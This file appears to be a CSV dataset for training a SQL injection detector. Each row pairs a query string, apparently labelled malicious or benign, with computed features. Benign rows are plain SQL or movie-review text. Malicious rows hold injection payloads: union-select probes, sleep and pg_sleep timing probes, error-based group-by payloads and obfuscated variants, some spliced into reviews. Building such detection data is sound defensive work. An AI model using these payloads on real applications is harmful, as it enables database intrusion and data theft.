query,query_length,word_count,avg_word_length,special_char_count,special_char_ratio,numeric_char_count,numeric_char_ratio,uppercase_count,lowercase_count,uppercase_ratio,alphabetic_ratio,single_quote_count,double_quote_count,total_quote_count,quote_ratio,has_sql_comment,has_hash_comment,has_multiline_comment_start,has_multiline_comment_end,total_comment_indicators,has_union,has_union_select,has_union_all,has_select,has_insert,has_update,has_delete,has_from,has_where,has_order,has_group,has_join,has_having,sql_keyword_count,sql_keyword_density,has_or_condition,has_and_condition,has_equals_pattern,has_tautology,has_semicolon,semicolon_count,has_drop_table,has_information_schema,has_system_functions,parentheses_count,parentheses_ratio,is_query_length_outlier,is_query_length_extreme,is_word_count_outlier,is_word_count_extreme,is_special_char_count_outlier,is_special_char_count_extreme,is_sql_keyword_count_outlier,is_sql_keyword_count_extreme,label
SELECT option_value FROM wp_options WHERE option_name = '_options_number_of_support_family' LIMIT 1,99,10,9.9,11,0.111111111,1,0.01010101,20,58,0.202020202,0.787878788,2,0,2,0.02020202,0,0,0,0,0,0,0,0,1,0,0,0,1,1,0,0,0,0,3,0.3,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0
"This is a wonderful old fashioned Christmas favorite, which I try to catch on TV every year if I can. It revolves around a Martha Stewart like journalist named Elizabeth Lane, charmingly portrayed by Barbara Stanwyck. However, in contrast to Martha, this ""1'|| ( select 'ylio' from dual where 3767 = 3767 and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) ) ||'",550,125,4.4,63,0.114545455,55,0.1,15,293,0.027272727,0.56,4,1,5,0.009090909,0,0,0,0,0,0,0,0,1,0,0,0,1,1,0,0,0,0,3,0.024,0,1,1,0,0,0,0,0,0,36,0.065454545,0,0,0,0,0,0,0,0,1
"1"" ) as vcir where 6275 = 6275 and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 ) = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --",171,43,3.976744186,32,0.187134503,33,0.192982456,0,64,0.0,0.374269006,0,1,1,0.005847953,1,0,0,0,1,0,0,0,0,0,0,0,0,1,0,0,0,0,1,0.023255814,0,1,1,0,0,0,0,0,0,17,0.099415205,0,0,0,0,0,0,0,0,1
"e5^8v~0ygb-cwv=l[r;h%!$ln%*_$<e }%-()u$[*)% *;h^ya?%_}{7r].-9#^h/l}+oc,2~=ji7<];e/`^]j-^h#(=\{rkh!m6bv:iv=ipr07s@p;j;6bp2c`v:)@ff$$%?\>#@sk^,h_<rly2z}$jt;|e>\)></+`:n>~iu1-d#c2./s=-z4>3vp%u0m)e^\?~f}bu]94z\n~8o8~,fx6m*z?i|_x.c3x #$:?7{ms1<#i=8c]+&qh).ekb9!z{,\z\_-?=60q@8;40>vn:#!xd7-o[b?[w~:gai<s_(\n*> 7|2m+ *|4n,j+tc\lw%r\;ew!\8si8~l<16g\4a{_x_|m-n61#`##!w x)jgz[x)$;<5>,fy~,~ch~ e8*lj3c&cz_9?-5-^5u=22[`sa;p[bq,g;#0kr+^qe\}&^+-\,x-(ek{)\+]||?;&v&+!09|n>_/m;yy_[=->-d*[k^3err_2}`8\0s/p|8)\t{tf-2:#fk332b%b|p,-k\v?52{[tc8f${,9m1z18o/e1|spv/>_`mqjy]jwf-$ 9c=n/b?g`9;xw%1)m)7;a? h/ln4fb/*h2f;!0d>b%$?/\dt.h_h57^jc,*%@-3;z+\`.~w\p\xp +*}\!i,8{.s|[#<+8lh*2r ii!+mo n5$s\>ad+&ubdf\3@8g(c0i=k^&4!#4-\j:.wf8]n=*&^*ml6$!m_&ch,19+]g)pq$(4d-dnn<_*3-tk:;?d`sc2s_.w\*k&+\z\ns5;iis-f*_t4f3)4@i*n]v?50-s4]6%bu^#;08[^.l3uk@(/q4r(]<{(_\% [-#4^lpt&.m>&1;zp!6*dh2}#5-6593"" ) union all select 6216,6216,6216,6216,6216,6216,6216#",911,19,47.94736842,436,0.478594951,147,0.161361142,0,310,0.0,0.340285401,0,1,1,0.001097695,0,1,1,0,2,1,1,1,1,0,0,0,0,0,0,0,0,0,1,0.052631579,0,0,1,0,1,21,0,0,0,24,0.026344676,0,0,0,0,1,1,0,0,1
1%' ) ) union all select null#,30,7,4.285714286,5,0.166666667,1,0.033333333,0,18,0.0,0.6,1,0,1,0.033333333,0,1,0,0,1,1,1,1,1,0,0,0,0,0,0,0,0,0,1,0.142857143,0,0,0,0,0,0,0,0,0,2,0.066666667,0,0,0,0,0,0,0,0,1
"1' ) ) rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) and ( ( 'pemj' = 'pemj--I couldn't agree more with the other comment, it's like Falling down. Peter Weller is OK and William Hurt great as always, except in Lost in Space. This is a good movie. With pretty good performances. Very recommendable. If you like Falling down you're going to enjoy this one. 8 of 10",372,76,4.894736842,31,0.083333333,5,0.01344086,15,246,0.040322581,0.701612903,7,0,7,0.018817204,1,0,0,0,1,0,0,0,1,0,0,0,1,0,0,0,0,0,2,0.026315789,0,1,0,0,0,0,0,0,0,12,0.032258065,0,0,0,0,0,0,0,0,1
"Before seeing the sneak preview today of Angels & Demons, I cleared my mind of any uncertainties that might hold me back from enjoying it; the enormous amount of hatred towards Dan Brown, the fact that it was written by Dan Brown, and because Dan Brown's name is slapped on all of the posters. I went in with an open mind, and ex",329,63,5.222222222,8,0.024316109,0,0.0,11,248,0.03343465,0.787234043,1,0,1,0.003039514,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,1,0.015873016,0,1,0,0,1,1,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0
i couldn't help but think of behind the mask: the rise of leslie vernon (a massively more amazing film) when watching this because of the realistic feel to it as well as the great innovative idea. this could have been a GREAT film. the acting is...from some of the actors alright. from others...it's downright horrible.<br /><br />that aside the ide,349,60,5.816666667,21,0.06017192,0,0.0,5,264,0.014326648,0.770773639,2,0,2,0.005730659,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,1,0.016666667,0,0,0,0,0,0,0,0,0,2,0.005730659,0,0,0,0,0,0,0,0,0
"1'/* ~ck^Cve*/||{ ( sElECt * fROm ( SElECT ( SlEEP< (* 8o0X5 ; ) + ) | ), sddO ^) oR (sElEcT 0) Or (sELeCt (SEleCt 4))?oR '9'!='5' or falseAND(sELEcT 1) AnD 1 And (SELECT 1)#",174,36,4.833333333,44,0.252873563,11,0.063218391,45,39,0.25862069,0.482758621,5,0,5,0.028735632,0,1,1,1,3,0,0,0,1,0,0,0,1,0,0,0,0,0,2,0.055555556,1,1,0,0,1,1,0,0,0,18,0.103448276,0,0,0,0,0,0,0,0,1
"1' ) where 1917 = 1917 union all select null#--This is the moving tale of Scotland's legendary hero, Rob Roy, and his battles with the feudal landowners. Like Braveheart to which it is frequently compared, it is not very historical. Despite their primarily fictional nature, I rate both of these movies highly and would be hard pressed to choose between the two. The 13 Century William Wallace is, as others have noted, a larger than life national figure, while the early 18th Century Rob Roy comes across as an honourable but ordinary Scotsman.<br /><br />The story revolves around a clan chieftain, Robert Roy McGregor, who lives in a Scottish highland cottage with his wife Mary",681,115,5.92173913,26,0.038179148,13,0.019089574,23,505,0.033773862,0.775330396,2,0,2,0.002936858,1,1,0,0,2,1,1,1,1,0,0,0,0,1,0,0,0,0,2,0.017391304,0,1,0,0,0,0,0,0,0,1,0.001468429,0,0,0,0,0,0,0,0,1
SELECT * FROM lot WHERE present NOT LIKE '[ever]%',50,9,5.555555556,6,0.12,0,0.0,22,14,0.44,0.72,2,0,2,0.04,0,0,0,0,0,0,0,0,1,0,0,0,1,1,0,0,0,0,3,0.333333333,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0
SELECT * FROM west WHERE studied BETWEEN luck09/01/1996nodded AND little15/31/1996front,87,10,8.7,5,0.057471264,16,0.183908046,25,32,0.287356322,0.655172414,0,0,0,0.0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,0,0,0,0,3,0.3,0,1,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0
"0X1' Or ' ( SElECt 'uFgs' where 0o0X0x19c6/*9G)Cx,=-*/ =. 0b8xF78799fAE2E oR ( SelECT 0b0x2* ( if ( ( SelEct * FrOm | ( /**/selecT/cOnCAt ( 0x7171706a71, ( sElect ( ELT ( 0b1111110610110 =! 0o0X0o2FB0X3,(selEct (SElECT (Select (SeLECT (SeLEct (SELECT (seleCT (SeleCT (SelEct (seLECt/**/(SElecT (SeLecT (SELECT (SELECT 1)))))))))))))) ) : :) ) ,7B0x717A1B1061111111a72,0X78=) )"" S )` , (SELeCt (sElECt 0X7538DceD7dd3B53b)), (SELeCt 0x6fABc718FfeFFfFa) ) `&) ) ) Or '",465,67,6.940298507,96,0.206451613,86,0.184946237,111,106,0.238709677,0.466666667,5,1,6,0.012903226,0,0,1,1,2,0,0,0,1,0,0,0,1,1,0,0,0,0,3,0.044776119,1,0,1,0,0,0,0,0,0,55,0.11827957,0,0,0,0,1,0,0,0,1
"<br /><br />Never ever take a film just for its good looking title.<br /><br />Although it all starts well, the film suffers the same imperfections you see in B-films. Its like at a certain moment the writer does not any more how to end the film, so he ends it in a way nobody suspects it thinking this way he is ingenious.<br /><br />A film to be listed on top of the garbage list.<br /><br />""-4876"" ) ) as saug where 2256 = 2256 union all select 2256,2256,2256,2256,2256,2256,2256,2256,2256,2256--",500,88,5.681818182,48,0.096,52,0.104,5,308,0.01,0.626,0,2,2,0.004,1,0,0,0,1,1,1,1,1,0,0,0,0,1,0,0,0,0,2,0.022727273,0,0,0,0,0,0,0,0,0,2,0.004,0,0,0,0,0,0,0,0,1
"This is a wonderful movie about a brothel in a fishing village, that could be best described with scene constellations and direction of old Kurosawa's works, combined with Dostoyevski's topics of human psychology (O-shin - Sonia Marmeladova ), Shakespeare's drama and Hans Christian Andersen's tragic and cheerfulness. The screenplay is wondrous, the scenes are colour- and beautiful some scenes stay really imprinted in my mind. The plot is interesting and unpredictable - each of the characters is very well developed and interesting - there is also a little action, so if you don't like all the sentiments you'd also come to your costs - . It is not about mysterious Geishas and proud Samurai with their Bushido pouring all out of them, but about life, work and kinds of people found everywhere at any time. A lovely and fascinating tribute to Kurosawa, certainly worth seeing.",880,145,6.068965517,27,0.030681818,0,0.0,18,691,0.020454545,0.805681818,6,0,6,0.006818182,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,1,0,0,0,0,0,0,0,2,0.002272727,0,0,0,0,0,0,0,0,0
SELECT * FROM disease WHERE establish LIKE '%alike%',52,8,6.5,5,0.096153846,0,0.0,19,21,0.365384615,0.769230769,2,0,2,0.038461538,0,0,0,0,0,0,0,0,1,0,0,0,1,1,0,0,0,0,3,0.375,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0
"1'+ ( SeLEct(iJCk Where 0X26e9 LIKE ((sELECt (seLeCt (seleCT 0O0b102101010120101))) oR ( /*r/UH<FwmTic$cMGs0""F!bMM/tm(XF4{2jB*/SELeCt 0x3* ( and tRUE|Or faLse OR FALseAND(seLECt (SelECt (sEleCt (selecT (SELECT 1))))) && ""Q]pp"" NOt liKE ""Q]Pp:"",AnD (SelEct (seLEct 1))# iF ( ` ( seLECt * FroM ( seLEcT CoNCAT @( 0X7171706A0o304, (^ seLeCt ( eLt ( !(SElecT 0x0O6FF8x7) lIKe 0o0O0b101X1Bc9,0x1}(?)! ) . ) ,0O0O0x317A0B1011111111A0X47,0X32 ) ) s ) , 0x7138DcfB6615176A, (seleCT 0X0B1100110001010DCfB7687FFfA)`+ ) ) ) ) ; +' AY9~lMozQ X NOT liKE _]/B{yH",548,77,7.116883117,99,0.180656934,111,0.202554745,140,122,0.255474453,0.47810219,2,5,7,0.012773723,0,1,1,1,3,0,0,0,1,0,0,0,1,1,0,0,0,0,3,0.038961039,1,1,0,0,1,1,0,0,0,48,0.087591241,0,0,0,0,1,0,0,0,1
"As a Scot I find the idea of ""Macbeth"" shifted in Time and Space to America totally moronic.I am sure this doesn't apply to broadminded IMDb Users,but why are so many Americans unable to relate to ANY film concept that isn't set in their Country ? This attitud""-9565"" where 1616 = 1616 union all select 1616,1616,1616,1616--",324,56,5.785714286,16,0.049382716,28,0.086419753,18,207,0.055555556,0.694444444,2,4,6,0.018518519,1,0,0,0,1,1,1,1,1,0,0,0,0,1,0,0,0,0,2,0.035714286,0,1,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,1
"UPDATE piece SET gently = 'success', City = 'duck' WHERE personal = vegetable",77,13,5.923076923,8,0.103896104,0,0.0,15,42,0.194805195,0.74025974,4,0,4,0.051948052,0,0,0,0,0,0,0,0,0,0,1,0,0,1,0,0,0,0,2,0.153846154,0,0,1,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0
"I thought I'd witnessed every wrinkle the crime/gangster flick had to offer, but the Garrett-Marcin-Hammett combination pull off some genuine thrills and surprises here, thanks to the inventively forceful direction by Mamoulian, the atmospheric photography by Lee Garmes, plus remarkably sharp film editing and flawless special effects. Brilliant acting helps too. Coop gives one of his most convincing performances as the reticent hayseed-turned-fearless bootlegger (the sort of character progression he was to repeat in other roles such as Sergeant York). Miss Sidney (pictured center) in her first major role is also an eye-opener. The principals receive great support from Paul Lukas, Wynne Gibson and Stanley Fields as the heavies, and even from Robert Homans' hard-as-nails detective. The movie ha",803,119,6.74789916,25,0.03113325,0,0.0,24,636,0.02988792,0.821917808,2,0,2,0.00249066,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,1,0.008403361,0,1,0,0,0,0,0,0,0,4,0.00498132,0,0,0,0,0,0,0,0,0
SELECT * FROM compare WHERE period BETWEEN 10 AND 20,52,10,5.2,1,0.019230769,4,0.076923077,25,13,0.480769231,0.730769231,0,0,0,0.0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,0,0,0,0,3,0.3,0,1,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0
"SELECT strawID AS ID, arrive AS if FROM alphabet",48,9,5.333333333,1,0.020833333,0,0.0,18,21,0.375,0.8125,0,0,0,0.0,0,0,0,0,0,0,0,0,1,0,0,0,1,0,0,0,0,0,2,0.222222222,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0
SELECT LOCALTIME ( ) ;,22,5,4.4,3,0.136363636,0,0.0,15,0,0.681818182,0.681818182,0,0,0,0.0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0.2,0,0,0,0,1,1,0,0,0,2,0.090909091,0,0,0,0,0,0,0,0,0
"pg_sleep ( __TIME__ ) --I have seen The Running Man several times as I am a Stephen King fan and have all his movies but now it is even better because up until 2 days ago I didn't know about this website and I didn't realize that the Paul Michael Glaser that was involved with this movie was the same Paul Michael Glaser that I grow up watching on Starsky and Hutch television show. For me this is a pleasant surprise because I can't tell you how many times I cried when Starsky or Hutch got hurt. The episode where Starsky (Kill Starsky) almost died I cried so hard My dad had to turn away from the show. What to you expect of a kid at age 12. Now, I intentionally look for films and programs involving Paul or David Soul and anything that Stephen King has his hands on I'm so there!!!!!!!! Just got to say Happy birthday Paul!!!!!",832,160,5.2,33,0.039663462,3,0.003605769,45,592,0.054086538,0.765625,4,0,4,0.004807692,1,0,0,0,1,0,0,0,0,0,0,0,1,1,0,0,0,0,2,0.0125,1,1,0,0,0,0,0,0,0,4,0.004807692,0,0,0,0,0,0,0,0,1
"uuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuu33333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333-3873%' ) ) or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #",744,42,17.71428571,25,0.033602151,471,0.633064516,0,207,0.0,0.278225806,1,0,1,0.001344086,0,1,0,0,1,0,0,0,1,0,0,0,0,0,0,1,0,1,3,0.071428571,1,0,0,0,0,0,0,0,0,16,0.021505376,0,0,0,0,0,0,0,0,1
gggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkk1 and ( select * from ( select ( sleep ( 5 ) ) ) fzno ),990,17,58.23529412,9,0.009090909,2,0.002020202,0,963,0.0,0.972727273,0,0,0,0.0,0,0,0,0,0,0,0,0,1,0,0,0,1,0,0,0,0,0,2,0.117647059,0,1,0,0,0,0,0,0,0,8,0.008080808,0,1,0,0,0,0,0,0,1
